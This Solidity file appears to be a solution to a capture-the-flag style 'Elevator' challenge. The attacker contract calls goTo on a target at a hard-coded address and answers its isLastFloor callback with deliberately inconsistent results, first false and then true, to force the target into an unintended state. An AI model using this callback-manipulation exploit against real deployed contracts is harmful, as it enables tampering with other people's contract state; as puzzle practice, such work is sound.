// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Elevator  {
  function goTo(uint) external;
}

contract building{
    uint floor=10;

    function attack() public{
        Elevator(0x03B92b1EabCbD8b1dfAbDfE00e4ace9f0ae9E207).goTo(10);
    }

    function isLastFloor(uint _floor) external returns (bool){
        ++floor;
        if(floor == 11){
            return false;
        }else{
            return true;
        }
    }

}